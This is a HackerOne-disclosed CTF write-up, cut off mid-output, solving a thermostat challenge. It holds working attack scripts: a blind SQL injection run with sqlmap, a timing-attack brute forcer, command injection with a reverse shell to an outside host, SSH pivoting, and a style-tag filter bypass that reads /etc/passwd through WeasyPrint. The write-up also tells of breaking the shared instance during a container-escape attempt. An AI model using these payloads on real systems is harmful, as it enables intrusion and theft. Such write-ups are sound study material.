{"id":504413,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQ0MTM=","url":"https://hackerone.com/reports/504413","title":"CTF write-up: c8889970d9fb722066f31e804e351993","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-03-03T10:08:22.630Z","submitted_at":"2019-03-03T10:08:22.630Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ret2jazzy","url":"/ret2jazzy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/106/874/b65d946b97ff3d971a091fc805c27b72ef815dd7_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:55:34.185Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:55:25.921Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"So the CTF starts with [this](https://twitter.com/Hacker0x01/status/1100543680383832065) tweet. \n\n{F434370}\n\nThe first image is about the 50 million in bounties but the second one looks related to the CTF. The first thing that comes to mind when relating CTFs and images is \"steganography\". \n\nUsing the all purpose steg tool [zsteg](https://github.com/zed-0xff/zsteg) as our first resort, we discover some interesting data in the image, hidden in the form of LSB steg. It can be isolated like this:\n\n```\nroot@pwnbox16:~/files# zsteg --lsb -b 1 -o yx D0XoThpW0AE2r8S.png\nb1,rgb,lsb,yx       .. zlib: data=\"https://bit.do/h1therm\", offset=5, size=22\n```\n\nThe shortened URL returns a [apk](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view). Instead of installing it, I decided to go with static analysis.\n\n-----\n\nAn apk is basically java compiled into bytecode, so it's easily decompilable. At first, I tried [jadx](https://github.com/skylot/jadx) but it was error-ing out on multiple functions, so I decided to take long way.\n\nI created a jar file out of the apk using [enjarify](https://github.com/Storyyeller/enjarify) and then decompiled it with [procyon](https://bitbucket.org/mstrobel/procyon). Along with that, I also disassembled it with apktool to get the other files such as the manifest and resources.\n\n```\nroot@pwnbox16:~/files# enjarify/enjarify.sh h1thermostat.apk \nUsing python3 as Python interpreter\n1000 classes processed\n2000 classes processed\nOutput written to h1thermostat-enjarify.jar\n2421 classes translated successfully, 0 classes had errors\n\nroot@pwnbox16:~/files# apktool d h1thermostat.apk \nI: Using Apktool 2.3.4 on h1thermostat.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nS: WARNING: Could not write to (/root/.local/share/apktool/framework), using /tmp instead...\nS: Please be aware this is a volatile directory and frameworks could go missing, please utilize --frame-path if the default storage directory is unavailable\nI: Loading resource table from file: /tmp/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n\n```\n Due to some Java dependency issues locally, I opted to use the online version of procyon availabe at http://www.javadecompilers.com/\n\nAfter getting the source and other resources/manifest, I popped it all in Android Studio. \n\nSkimming over the source, the app looks like a remote controller for a thermostat. \n\nAccording to the `AndroidManifest.xml`, the MainActivity was `com.hackerone.thermostat.LoginActivity`.\n\n{F434392}\n\nLooking over `LoginActivity`, we identify some interesting functions such as `attemptLogin()`. \n\n{F434393}\n\nThe main part happens right at the end.\n\n```java\n            this.showProgress(b);\n            final JSONObject jsonObject = new JSONObject();\n            jsonObject.put(\"username\", (Object)LoginActivity.username);\n            jsonObject.put(\"password\", (Object)LoginActivity.password);\n            jsonObject.put(\"cmd\", (Object)\"getTemp\");\n            Volley.newRequestQueue((Context)this).add(new PayloadRequest(jsonObject, new LoginActivity$3(this)));\n```\n\nIt basically creates a JSON object with the username and password we enter, along with `\"cmd\" : \"getTemp\"`. It then creates a new PayloadRequest object and adds it to the request queue.\n\nThe PayloadRequest class is even more interesting...\n\n{F434420}\n\nThe main thing happens in `BuildPayload`:\n\n```java\n    private String buildPayload(final JSONObject jsonObject) {\n        final int n = 16;\n        final byte[] array2;\n        final byte[] array = array2 = new byte[n];\n        array2[0] = 56;\n        array2[1] = 79;\n        array2[2] = 46;\n        array2[3] = 106;\n        array2[4] = 26;\n        array2[5] = 5;\n        array2[6] = -27;\n        array2[7] = 34;\n        array2[8] = 59;\n        array2[9] = -128;\n        array2[10] = -23;\n        array2[11] = 96;\n        array2[12] = -96;\n        array2[13] = -90;\n        array2[14] = 80;\n        array2[15] = 116;\n        final SecretKeySpec secretKeySpec = new SecretKeySpec(array, \"AES\");\n        final byte[] array3 = new byte[n];\n        new SecureRandom().nextBytes(array3);\n        final IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);\n        final Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        instance.init(1, secretKeySpec, ivParameterSpec);\n        final byte[] doFinal = instance.doFinal(jsonObject.toString().getBytes());\n        final byte[] array4 = new byte[doFinal.length + n];\n        System.arraycopy(array3, 0, array4, 0, n);\n        System.arraycopy(doFinal, 0, array4, n, doFinal.length);\n        return Base64.encodeToString(array4, 0);\n```\n\nIt basically encrypts our JSON object (stringified) using AES-CBC with a static key and a randomly generated IV. It then prepends the IV to the encrypted string (for decryption) and base64 encodes it.\n\nA POST request is sent with the encrypted JSON in the `d` parameter to `http://35.243.186.41/`, according to the constructor:\n\n```\n    public PayloadRequest(final JSONObject jsonObject, final Response$Listener mListener) {\n        super(1, \"http://35.243.186.41/\", new PayloadRequest$1(mListener));\n        this.mListener = mListener;\n        (this.mParams = new HashMap()).put(\"d\", this.buildPayload(jsonObject));\n    }\n```\n\nThe response is also encrypted, as the `parseNetworkResponse` function tries to decrypt it\n\n```java\n    protected Response parseNetworkResponse(final NetworkResponse networkResponse) {\n        try {\n            try {\n                final byte[] decode = Base64.decode(new String(networkResponse.data), 0);\n                final int n = 16;\n                final byte[] array = new byte[n];\n                System.arraycopy(decode, 0, array, 0, n);\n                final byte[] array2 = new byte[decode.length - n];\n                try {\n                    System.arraycopy(decode, n, array2, 0, decode.length - n);\n                    final byte[] array3 = new byte[n];\n                    try {\n                        final byte[] array4 = array3;\n                        array4[0] = 56;\n                        array4[1] = 79;\n                        array4[2] = 46;\n                        array4[3] = 106;\n                        array4[4] = 26;\n                        array4[5] = 5;\n                        array4[6] = -27;\n                        array4[7] = 34;\n                        array4[8] = 59;\n                        array4[9] = -128;\n                        array4[10] = -23;\n                        array4[11] = 96;\n                        array4[12] = -96;\n                        array4[13] = -90;\n                        array4[14] = 80;\n                        array4[15] = 116;\n                        final SecretKeySpec secretKeySpec = new SecretKeySpec(array3, \"AES\");\n                        final IvParameterSpec ivParameterSpec = new IvParameterSpec(array);\n                        final Cipher instance = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n                        instance.init(2, secretKeySpec, ivParameterSpec);\n                        final Cipher cipher = instance;\n                        try {\n                            final byte[] doFinal = cipher.doFinal(array2);\n                            try {\n                                final JSONObject jsonObject = new JSONObject(new String(doFinal));\n                                if (jsonObject.getBoolean(\"success\")) {\n                                    return Response.success(null, this.getCacheEntry());\n                                }\n                                final String string = jsonObject.getString(\"error\");\n                                try {\n                                    return Response.success(string, this.getCacheEntry());\n                                }\n                                catch (Exception ex) {\n                                    return Response.success(\"Unknown\", this.getCacheEntry());\n                                }\n                            }\n...\u003crest snipped out\u003e...\n```\n\nI quickly wrote a encryption/decryption routine in python to help me send requests to the server. \n\n```python\nimport requests\nimport sys\nfrom Crypto.Cipher import AES\n\ndef pad(s):\n    return s + chr(0x10 - len(s)%0x10) * (0x10 - len(s)%0x10) \n\ndef unpad(s):\n    return s[:-ord(s[-1])]\n\nKEY = '\\x38\\x4f\\x2e\\x6a\\x1a\\x05\\xe5\\x22\\x3b\\x80\\xe9\\x60\\xa0\\xa6\\x50\\x74'\n\n \ndata = (\"A\" * 16 + AES.new(KEY, AES.MODE_CBC, \"A\" * 16).encrypt(pad(sys.argv[1]))).encode('base64')\nresp = requests.post(\"http://35.243.186.41/\", data={'d': data}).text.decode('base64')\n\nprint unpad(AES.new(KEY, AES.MODE_CBC, resp[:16]).decrypt(resp[16:]))\n```\n\nIt basically takes the first command line parameter, encrypts it and sends the request to the server. Then it decrypts the response and prints it.\n\nUsing it to tamper with the server, I identified `admin:password` as a valid user/pass combination\n\n```\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin\", \"password\":\"admin\", \"cmd\":\"getTemp\"}'\n{\"success\": false, \"error\": \"Invalid username or password\"}\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin\", \"password\":\"password\", \"cmd\":\"getTemp\"}'\n{\"temperature\": 73, \"success\": true}\n```\n\nPlaying around with it a little more, I also identified a blind SQLi in the username.\n\n```\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin'\\'' and 1=1#\", \"password\":\"password\", \"cmd\":\"getTemp\"}'\n{\"temperature\": 73, \"success\": true}\nroot@pwnbox16:~/files# python remote.py '{\"username\":\"admin'\\'' and 1=2#\", \"password\":\"password\", \"cmd\":\"getTemp\"}'\n{\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\n1=1 returns true while 1=2 makes the statement false, making it return `Invalid username/password`.\n\nIdeally at this point, I would've used SQLMap to dump the whole db because blind SQLi is tedious but since everything is encrypted, I cannot directly use SQLmap.\n\nNow, I can either script the blind SQLi or use some trick to get SQLmap to work. I decided to go with the latter.\n\nThe brilliant idea is to write simple webapp in Flask which would take the plaintext values as GET parameters, encrypt them and forward them to the actual server and return the decrypted response, acting like a encryption/decryption proxy.\n\n```python\nfrom flask import Flask, request\nfrom Crypto.Cipher import AES\nimport requests\nimport json\n\ndef pad(s):\n    padn = 16 - (len(s) % 16)\n    return s + chr(padn) * padn\n\ndef unpad(s):\n    return s[:-ord(s[-1])]\n\nKEY = '\\x38\\x4f\\x2e\\x6a\\x1a\\x05\\xe5\\x22\\x3b\\x80\\xe9\\x60\\xa0\\xa6\\x50\\x74'\n\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hack():\n    data = {\"username\": request.args.get('username'), \"password\": request.args.get('password'), \"cmd\": \"getTemp\"}\n    enc  = (\"A\" * 16 + AES.new(KEY, AES.MODE_CBC, \"A\" * 16).encrypt(pad(json.dumps(data)))).encode('base64')\n    resp = requests.post(\"http://35.243.186.41/\", data={'d': enc}).text.decode('base64')\n    return unpad(AES.new(KEY, AES.MODE_CBC, resp[:16]).decrypt(resp[16:]))\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', threaded=True)\n```\n\nNow I can basically run SQLmap on localhost with plaintext values and not worry about any encryption/decryption. \n\n```\nroot@pwnbox16:~/files# python sqlmap.py -u \"http://localhost:5000/?username=admin\u0026password=admin\" --level 5 --risk 3 --dump\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.2.11.6#dev}\n|_ -| . [.]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n\u003csnip\u003e....\nsqlmap identified the following injection point(s) with a total of 556 HTTP(s) requests:\n---\nParameter: username (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin' AND 2307=(SELECT (CASE WHEN (2307=2307) THEN 2307 ELSE (SELECT 8582 UNION SELECT 1355) END))-- zTlo\u0026password=admin\u0026cmd=getTemp\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- fbmN\u0026password=admin\u0026cmd=getTemp\n---\n[18:25:51] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL \u003e= 5.0.12 (MariaDB fork)\n[18:25:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries\n[18:25:51] [INFO] fetching current database\n[18:25:51] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval\n[18:25:51] [INFO] retrieved: flitebackend\n\u003csnip\u003e....\n````\n\nThe `flitebackend` looks like main DB and it only has two tables named `users` and `devices`. The `users` table only has one entry\n```\nDatabase: flitebackend\nTable: users\n[1 entry]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+----+----------+----------------------------------+\n```\n\nThe `devices` table has 151 entries, essentially consisting of IPs\n\n```\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 192.88.99.253   |\n| 2   | 192.88.99.252   |\n| 3   | 10.90.120.23    |\n| 4   | 244.188.235.4   |\n\u003csnip\u003e....\n| 149 | 243.99.63.239   |\n| 150 | 10.17.63.143    |\n| 151 | 192.88.99.59    |\n+-----+-----------------+\n\n```\n\nThe next logical course of action would be related to the IPs, so we nmap-ed all the IPs.\n\n```\nroot@pwnbox16:~/files# for ip in `cat IPs.txt`; do nmap -v \"$ip\"; done\n\nStarting Nmap 7.01 ( https://nmap.org ) at 2019-03-03 02:59 UTC\nInitiating Ping Scan at 02:59\nScanning 192.88.99.253 [4 ports]\nCompleted Ping Scan at 02:59, 0.20s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 02:59\nCompleted Parallel DNS resolution of 1 host. at 02:59, 0.00s elapsed\n\u003csnip\u003e....\n```\n\nThe only IP that stood out is the `104.196.12.98` because it had port 80 open. We see a promising `FliteThermostat login` page when visiting it.\n\n{F434443}\n\nTrying to login, we observe a weird behaviour. Instead of sending the username and password in the login request, it actually sent a custom hash based on our username/password, derived from http://104.196.12.98/login.js,\n\nThe hash is based on [RC4](https://en.wikipedia.org/wiki/RC4) and XORs but I won't go deep into explaining it as it's irrelevant for the CTF. \n\nThis is where we got stuck for a few hours. During that time, we went back to the original SQLi and chased the rabbit of trying to read local files using `load_file()` as it was running as `root@localhost` user.\n\nOther than that, we also found a \"setTemp\" command in the `ThermostatModel.java` of the android apk but it wasn't useful either.\n\nWhen nothing else panned out, we went back and just started playing with the endpoint more.  During the recon process, we dirsearched and found a few endpoints but all of them just 302-ed back to root as they probably required authentication.\n\n```\n\nTarget: http://104.196.12.98/\n\n[20:18:02] Starting: \n[20:18:04] 400 -  157B  - /%2e%2e/google.com\n[20:18:44] 302 -  209B  - /control  -\u003e  http://104.196.12.98/\n[20:19:33] 302 -  209B  - /main  -\u003e  http://104.196.12.98/\n[20:20:05] 302 -  209B  - /update  -\u003e  http://104.196.12.98/\n```\n\nDeducing from the response headers, especially the all caps \"METHOD NOT ALLOWED\" when sending an invalid http verb, it felt like a Flask webapp running behind the nginx.\n\nAfter a few hours of misery, we finally had a breakthrough. \n\nIf we send a hash of the length 64, which is what login.js generates, it would take 0.5 seconds for a response but if the length is not 64, it would return in 0.05 seconds. \n\n```\nubuntu@ip-172-31-22-54:~$ time curl -X POST 'http://104.196.12.98/' -d 'hash=abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabca'\n....\nreal\t0m0.559s\nuser\t0m0.008s\nsys\t0m0.000s\n\nubuntu@ip-172-31-22-54:~$ time curl -X POST 'http://104.196.12.98/' -d 'hash=aaaaa'\n....\nreal\t0m0.057s\nuser\t0m0.008s\nsys\t0m0.000s\n````\n\nThis points to your typical timing attack. @corb3nik wrote a quick script to verify it by bruting the first byte (2 characters as it's hex encoded) and sure enough, the first byte is `f9`. \n\n```\nubuntu@ip-172-31-22-54:~$ time curl -X POST 'http://104.196.12.98/' -d 'hash=f9cdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd'\n...\nreal\t0m1.059s\nuser\t0m0.004s\nsys\t0m0.004s\n```\n\nIt took 0.5 more seconds than usual, and now it's just a matter of scripting it. The server was kinda unreliable, so we did some super advanced heuristics to get the right character.\n\nHere is the final script:\n\n```python\n#!/usr/bin/env python3\n\nimport requests\nimport time\nimport binascii\nimport threading\n\nURL = \"http://104.196.12.98/\"\nDATA = {\n   \"hash\" : \"\"\n}\nHEADERS = {\n   \"Content-Type\" : \"application/x-www-form-urlencoded\"\n}\n\nRESULTS = {}\nCURRENT = b''\n#CURRENT = b'\\xf9\\x86ZIR\\xa4\\xf5\\xd7KC\\xf3U\\x8f\\xedj\\x02%\\xc6\\x87\\x7f\\xba`\\xa2P\\xbc\\xbd\\xe7S\\xf5\\xdb\\x13'\n\ndef test(attempt):\n   before = time.time()\n   data = dict(DATA)\n   data['hash'] = binascii.hexlify(CURRENT + bytes([attempt])).ljust(64, b\"0\")\n   r = requests.post(URL, data=data, headers=HEADERS)\n   print(r, len(r.text))\n   after = time.time()\n\n   diff = after - before\n   RESULTS[attempt] = diff\n\n\nwhile True:\n   possibilities = [i for i in range(0xff)]\n\n   while True:\n       threads = []\n       RESULTS = {}\n\n       m = 0\n       for attempt in list(possibilities):\n           thread = threading.Thread(target=test, args=(attempt,))\n           thread.start()\n           m += 1\n\n           if m % 7 == 0:\n               time.sleep(1.5)\n           threads.append(thread)\n\n       for thread in threads:\n           thread.join()\n\n       THRESHOLD = 0.50 * (len(CURRENT) + 2)\n       for attempt in RESULTS:\n           t = RESULTS[attempt]\n           if RESULTS[attempt] \u003c THRESHOLD:\n               possibilities.remove(attempt)\n\n       if len(possibilities) \u003c= 1:\n           break\n\n       print(possibilities)\n\n   CURRENT = CURRENT + bytes([possibilities[0]])\n   print(CURRENT)\n```\n\nThe final hash came out to be `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`\n\nUsing it to login, we are presented with a very simple page:\n\n{F434454}\n\nIn the HTML source, we also see a commented out `/diagnostics` endpoint\n\n```\n\t\t\u003cul\u003e\n\t\t\t\u003cli\u003e\u003ca href=\"/control\"\u003eTemperature control\u003c/a\u003e\u003c/li\u003e\n\t\t\t\u003cli\u003e\u003ca href=\"/update\"\u003eCheck for updates\u003c/a\u003e\u003c/li\u003e\n\t\t\t\u003c!--\u003cli\u003e\u003ca href=\"/diagnostics\"\u003eDiagnostics\u003c/a\u003e\u003c/li\u003e--\u003e\n\t\t\u003c/ul\u003e\n```\n\nBut it returns \"Forbidden\" when we try to access it. Later on, we will find out that it was just a red herring and all the time I spent on accessing it was a waste.\n\nThe `/update` endpoint probably tries to connect to a host and looks for an update manifest file, but it always errors as the host:post used is invalid\n\n{F434469}\n\nThe `/control` endpoint shows us the temperature of the supposed thermostat and allows us to change it too. It didn't turn out to be useful either except we could have an extremely large/small temperature.\n\n{F434477}\n\nWell, we started the typical recon process and bruted the GET parameters for the `/update` and `/control`. Soon enough, `port` was discovered as a valid parameter on `/update`\n\nThe `port` basically controlled port to where the server tried to look for the update file. It only accepted integers and supplying `port` as 1337 made the server connect to `http://update.flitethermostat:1337/`\n\n{F434479}\n\nNow if we can control the port, we might able to control the host too. The hard part was guessing the parameter it depended on. We tried `host`, `hostname` and all the other obvious names but none worked. The whole wordlist of param-miner also returned nothing.\n\nNow this is where we got stuck and called it a night (it was already 2am). \n\n----\n\nNext morning, we stumbled upon [this](https://twitter.com/daeken/status/1101358829168558080) tweet from the challenge author, an underscore (`_`). \n\nThis looks like a CTF hint, maybe we have to brute parameters with underscores? Anyhow @corb3nik mutated his wordlist with underscores in the prefix, suffix and two words joined with an underscore. \n\nAnd after some more advanced guessing, we finally figured out the parameter name. It is called `update_host`. This was such a stretch.....\n\nNext, It didn't take us long to discover the command injection in it. Our input is probably being passed unsanitized in a command and we can easily inject arbitrary commands by using backticks\n\n{F434483}\n\nNext, we got a reverse shell using\n\n```\necho \"bash -i \u003e\u0026 /dev/tcp/p.hacker.af/8181 0\u003e\u00261\"|bash\n```\n(piping to bash as the server was using /bin/sh)\n\nAnd there, we got the shell.\n\n```\nubuntu@ip-172-31-22-54:~$ nc -nlvp 8181\nListening on [0.0.0.0] (family 0, port 8181)\nConnection from 104.196.12.98 57122 received!\nbash: cannot set terminal process group (10): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@4d131d414079:/app#\n```\n\nLooks like we are root and inside an docker instance. Let's take a look at the source now\n\n```\nroot@4d131d414079:/app# cat main.py\nfrom flask import Flask, abort, redirect, render_template, request, Response, session\nfrom jinja2 import Template\nimport base64, json, os, random, re, subprocess, time\n\napp = Flask(__name__)\napp.secret_key = '99807ef08993b1cf019f6cd30fa3acbfbda992ee2aeffc5339f0f130e25604c4'\n\n\u003csnip\u003e...\n\n@app.route('/diagnostics')\ndef diagnostics():\n\tif 'loggedIn' not in session or not session['loggedIn']:\n\t\treturn redirect('/')\n\treturn 'Forbidden', 403\n\nif __name__ == \"__main__\":\n\tapp.run(host='0.0.0.0', port=80)\n\n```\n\nCAN YOU BELIEVE IT? The whole diagnostics was a ruse....\n\n----\n\nWe started playing around and that's when I broke the challenge. It was a shared docker instance and I was trying to escape it, so I overwrote the docker entrypoint and broke everything.\n\nEssentially, I was trying the recent docker CVE-2019-5736. I was hopeful that it might work because the filesystem persisted even after a forced restart (`kill -9 1`). In the process of verifying it, I overwrote the /usr/bin/python (the entrypoint) binary with '1' hoping that it would crash during the force reboot and a new fresh instance would start up.\n\nInstead, it went down and never came up. We messaged Cody and even went to talk to him IRL. We asked him about the docker escape and he was like \"No, you guys are way overthinking this\" and then he restarted the challenge. He also turned down our approach of leaking stuff with the Google Cloud Metadata.\n\nWell, the next thing we did was to install some useful tools (`net-tools`, `nmap`) in the otherwise minimal docker image. Then we scanned the local subnet\n\n```\nroot@4d131d414079:/app# ifconfig\neth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e  mtu 1500\n        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255\n        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)\n        RX packets 702225  bytes 97006785 (92.5 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 560986  bytes 152943040 (145.8 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1  (Local Loopback)\n        RX packets 2  bytes 1033 (1.0 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 2  bytes 1033 (1.0 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nroot@4d131d414079:/app# nmap -v 172.19.0.0/16\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-03 07:05 UTC\nInitiating ARP Ping Scan at 07:05\nScanning 4096 hosts [1 port/host]\n\u003csnip\u003e\nDiscovered open port 22/tcp on 172.19.0.1\nDiscovered open port 80/tcp on 172.19.0.3\nDiscovered open port 80/tcp on 172.19.0.1\n```\n\nPort 80 was open on 172.19.0.3, that sounds promising....\n\n```\nroot@4d131d414079:/app# curl 172.19.0.3\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\t\u003chead\u003e\n\n\u003csnip\u003e....\n\t\t\t\n\u003cb\u003eMaterials contained within are confidential and for HackerOne employee eyes only\u003c/b\u003e\n\n\u003csnip\u003e...\n```\n\nSo another webapp, huh? It's hosted on the private subnet of the docker instance, so we can't directly access it from the outside. It would suck to exploit it over curl, so let's pull some super advanced networking tricks make it more accessible.\n\nSince it's a docker instance and I'm behind a NAT myself, we can't directly reach each other. So I will be using a Jump box to pull some ssh forwarding tricks. \n\nI installed `sshd` on the docker instance, and then forwarded the local port 22 to port 2222 on my Jumpbox.\n\n```\nroot@4d131d414079:/app# service ssh start\nStarting OpenBSD Secure Shell server: sshd.\n\nroot@4d131d414079:/app# ssh ubuntu@p.hacker.af -R 2222:localhost:22\nubuntu@p.hacker.af's password:\n\u003csnip\u003e...\n```\n\nThen I forward the port 2222 on my Jumpbox to 4444 locally\n\n```\n$ ssh ubuntu@p.hacker.af -L 4444:localhost:2222\n```\n\nNow I can basically reach the docker instance by ssh-ing to localhost on port 4444. I already had my public key added, so everything works out nicely.\n\n```\n $ ssh root@localhost -p 4444                            \nThe authenticity of host '[localhost]:4444 ([127.0.0.1]:4444)' can't be established.\nECDSA key fingerprint is SHA256:x5ufg0rDo0ac001Yng3bJFS6yDyfk6H8ZZnOFj++kJM.\n\u003csnip\u003e....\nLast login: Sat Mar  2 09:31:09 2019 from 127.0.0.1\nroot@4d131d414079:~#\n```\n\nWell, now we use the fancy dynamic forwarding feature of SSH .\n\n```\nroot@pwnbox16:~/files/# ssh root@localhost -p 4444 -D 6666\n```\n\nUsing localhost:6666 as a SOCKS proxy, we can access the private subnet of the docker instance now.\n\n{F434515}\n\nFrom the UI, we can see an invoices and reports page. But they're both login protected\n\n{F434519}\n\nInstead of playing around with the login, I decided to concentrate on a commented endpoint I found in the HTML source of invoices.\n\n```html\n\n\t\t\t\t\t\u003cli  class=\"nav-item\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/\"\u003eHome\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\t\u003cli  class=\"nav-item\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/reports\"\u003eReports\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\t\u003cli  class=\"nav-item active\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/invoices\"\u003eInvoices\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e\n\t\t\t\t\t\n\t\t\t\t\t\u003c!--\u003cli  class=\"nav-item\" \u003e\n\t\t\t\t\t\t\u003ca class=\"nav-link\" href=\"/invoices/new\"\u003eNew Invoice\u003c/a\u003e\n\t\t\t\t\t\u003c/li\u003e--\u003e\n```\n\nThe `/invoices/new` looked pretty interesting....\n\n{F434520}\n\nSo we have a \"preview\" and a \"Save PDF\" feature. Capturing the request in Burp, we observe JSON being sent as a GET parameter\n\n{F434521}\n\nThe preview endpoint generates a HTML page based on our input and the Save PDF endpoint probably uses that HTML and parses it into a PDF. \n\nSeems to me that we need to get XSS and somehow get the PDF renderer to parse our arbitrary HTML/Javascript. Then, we might be able to leverage it into an LFD by using iframes etc.\n\nPlaying around with it a little, we quickly identify the unsanitized input in the \"body\" key of the JSON. \n\n{F434522}\n\nWe tried to close the style tag with `\u003c/style\u003e` but apparently it got stripped out. Looks like the work of some shitty WAF. It didn't take us long to use it's stripping against itself `\u003c/sty\u003c/style\u003ele\u003e`.\n\n{F434524}\n\nThe only thing left now is to get a LFD. I leaked information about the backend PDF to HTML parser by adding a rogue img tag pointing to my server. Here was the request I received\n\n```\nubuntu@ip-172-31-22-54:~$ nc -nlvp 8182\nListening on [0.0.0.0] (family 0, port 8182)\nConnection from 104.196.12.98 50666 received!\nGET / HTTP/1.1\nHost: p.hacker.af:8182\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n```\n\nLooks like it's using [WeasyPrint](https://weasyprint.org/) to parse the HTML into PDF. I had never encountered it before, so I began reading the documentation.\n\nIt doesn't support Javascript, but the security section on the Tutorial page seems promising.\n\n{F434528}\n\nIt basically states we can access local files using `file://` URI. But unfortunately, neither iframes or embed/object tags worked with local files. All of those just displayed a blank blox.\n\nI was out of ideas, so I decided to postpone the hacking to later than night (back when I'd be in hotel). \n\nAt around midnight, I started again and began reading the documentation again. That's when I stumbled upon the [features](https://weasyprint.readthedocs.io/en/stable/features.html) page. \n\n{F434530}\n\nHere is the interesting part:\n\n```\nAttachments are related files, embedded in the PDF itself. They can be specified through \u003clink rel=attachment\u003e elements to add resources globally or through regular links with \u003ca rel=attachment\u003e to attach a resource that can be saved by clicking on said link. The title attribute can be used as description of the attachment.\n```\n\nSo basically if I make the `\u003clink\u003e` tag with `rel=\"attachment\"`, it will store the reference as a \"attachment\" in the PDF. Let's try using it with a reference to `file:///etc/passwd`.\n\n```\nroot@pwnbox16:~/files/pdfhack# curl -g --proxy socks5h://localhost:6666 'http://172.19.0.3/invoices/pdfize?d={\"companyName\":\"Acme Tools\",\"email\":\"accounting@acme.com\",\"invoiceNumber\":\"0001\",\"date\":\"2019-04-01\",\"items\":[[\"1\",\"\",\"\",\"10\"]],\"styles\":{\"body\":{\"background-color:white}\u003c/sty\u003c/style\u003ele\u003e\u003clink rel=\\\"attachment\\\" href=\\\"file:///etc/passwd\\\"\u003e\":\"white\"}}}'  -o out.pdf\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   